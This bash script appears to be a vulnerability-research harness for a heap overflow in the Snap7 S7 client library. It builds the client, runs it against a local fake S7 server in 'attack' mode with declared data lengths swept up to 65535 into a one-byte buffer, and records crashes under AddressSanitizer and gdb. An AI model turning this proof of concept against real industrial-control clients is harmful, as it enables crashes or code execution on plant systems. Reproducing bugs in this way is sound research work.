#!/usr/bin/env bash
# Vary the attack parameter itself: declared DataLength, with a one-byte
# destination. W7 varied only the destination size while the copy stayed at
# 0xFFFF, so every case died inside memcpy before free(). This sweep asks
# whether a moderate over-length that stays inside mapped brk heap reaches the
# caller's delete[]/free() and what happens there.
#
# New artifacts only: fake_s7_server_modlen.py, this script, and evidence in
# evidence/modlen/. Binary and port file live in the ignored live/bin/.
set -u -o pipefail

HERE=$(cd "$(dirname "$0")" && pwd)
SRC="$HERE/snap7-30f37da3114024a71ba93f7fd855c680b97a406f"
OUT="$HERE/evidence/modlen"
BIN="$HERE/bin"
mkdir -p "$OUT" "$BIN"
PORTFILE="$BIN/port-modlen.txt"
SUMMARY="$OUT/summary.txt"
: > "$SUMMARY"

python3 - "$HERE/../src/SHA256SUMS" "$BIN/pinned.sha256" <<'PY'
import sys
mapping = {
    's7_micro_client.cpp.30f37da': 'src/core/s7_micro_client.cpp',
    's7_micro_client.h.30f37da': 'src/core/s7_micro_client.h',
    's7_types.h.30f37da': 'src/core/s7_types.h',
    's7_isotcp.h.30f37da': 'src/core/s7_isotcp.h',
}
out = []
for line in open(sys.argv[1]):
    digest, name = line.split()
    if name in mapping:
        out.append('%s  %s\n' % (digest, mapping[name]))
open(sys.argv[2], 'w').writelines(out)
assert len(out) == 4
PY
( cd "$SRC" && sha256sum -c --quiet "$BIN/pinned.sha256" ) || exit 1

g++ -std=gnu++11 -g -O0 -I"$SRC/src/core" -I"$SRC/src/sys" \
    -o "$BIN/modlen-plain" "$HERE/live_client.cpp" \
    "$SRC/src/core/s7_micro_client.cpp" "$SRC/src/core/s7_peer.cpp" \
    "$SRC/src/core/s7_isotcp.cpp" "$SRC/src/core/s7_text.cpp" \
    "$SRC/src/sys/snap_msgsock.cpp" "$SRC/src/sys/snap_sysutils.cpp" \
    "$SRC/src/sys/snap_threads.cpp" -lpthread -lrt 2> "$OUT/build.log" || {
    cat "$OUT/build.log"; exit 1; }

start_server() {
    rm -f "$PORTFILE"
    if [ "$2" = "none" ]; then
        python3 "$HERE/fake_s7_server_modlen.py" "$1" "$PORTFILE" \
            "$OUT/$3-server.log" &
    else
        python3 "$HERE/fake_s7_server_modlen.py" "$1" "$PORTFILE" \
            "$OUT/$3-server.log" "$2" &
    fi
    srv=$!
    for _ in $(seq 1 200); do
        [ -s "$PORTFILE" ] && break
        kill -0 "$srv" 2>/dev/null || break
        sleep 0.05
    done
    if [ ! -s "$PORTFILE" ]; then
        echo "FAIL tag=$3: server never published a port"
        kill "$srv" 2>/dev/null || true
        return 1
    fi
    port=$(cat "$PORTFILE")
}

run_case() {
    mode=$1
    declared=$2
    tag=$3
    start_server "$mode" "$declared" "$tag" || return 1
    LIVE_DEST_SIZE=1 "$BIN/modlen-plain" "$port" \
        > "$OUT/$tag-client.log" 2>&1
    rc=$?
    wait "$srv" 2>/dev/null || true
    # Only stable tokens go into the summary; ports, PIDs and addresses stay
    # in the raw server/client logs.
    outcome=$(grep -oE 'CLIENT_READ_RC=[0-9]+ ITEM_RESULT=[0-9]+ DST0=[0-9a-f]+' \
        "$OUT/$tag-client.log" | tr '\n' ' ')
    printf 'TAG=%s MODE=%s DECLARED=%s RC=%s %s\n' \
        "$tag" "$mode" "$declared" "$rc" "$outcome" | tee -a "$SUMMARY"
}

run_case safe 1 safe1
for d in 256 1024 4096 16384 32768 49152 65535; do
    run_case attack "$d" "atk$d"
done

# ASan proof that a moderate case really copies the declared length into the
# one-byte allocation (not a harness artifact that skipped the memcpy).
CXXFLAGS="-std=gnu++11 -g -O0 -fno-omit-frame-pointer -fsanitize=address -I$SRC/src/core -I$SRC/src/sys"
SOURCES="$SRC/src/core/s7_peer.cpp $SRC/src/core/s7_isotcp.cpp $SRC/src/core/s7_text.cpp $SRC/src/sys/snap_msgsock.cpp $SRC/src/sys/snap_sysutils.cpp $SRC/src/sys/snap_threads.cpp"
g++ $CXXFLAGS -o "$BIN/modlen-asan" "$HERE/live_client.cpp" \
    "$SRC/src/core/s7_micro_client.cpp" $SOURCES -lpthread -lrt \
    2> "$OUT/build-asan.log" || { cat "$OUT/build-asan.log"; exit 1; }
start_server attack 4096 asan4096 || exit 1
LIVE_DEST_SIZE=1 "$BIN/modlen-asan" "$port" \
    > "$OUT/asan4096-client.log" 2>&1
asan_rc=$?
wait "$srv" 2>/dev/null || true
write_size=$(grep -oE 'WRITE of size [0-9]+' "$OUT/asan4096-client.log" | grep -oE '[0-9]+')
frame_line=$(grep -oE 's7_micro_client.cpp:[0-9]+' "$OUT/asan4096-client.log" | grep -oE '[0-9]+$' | head -1)
printf 'ASAN DECLARED=4096 RC=%s WRITE_OF_SIZE=%s FRAME_LINE=%s\n' \
    "$asan_rc" "$write_size" "$frame_line" | tee -a "$SUMMARY"

# Frame the 4096 case under gdb; a normal exit is the expected observation.
start_server attack 4096 gdb4096 || exit 1
LIVE_DEST_SIZE=1 gdb -q -batch -ex "set pagination off" -ex run \
    -ex "bt 6" --args "$BIN/modlen-plain" "$port" \
    > "$OUT/gdb4096.log" 2>&1
wait "$srv" 2>/dev/null || true
printf 'GDB DECLARED=4096 %s\n' \
    "$(grep -oE 'exited normally|Program received signal[^ ]*' "$OUT/gdb4096.log" | tr '\n' ' ')" \
    | tee -a "$SUMMARY"

echo "SUMMARY_SHA256=$(sha256sum "$SUMMARY" | cut -d' ' -f1)"
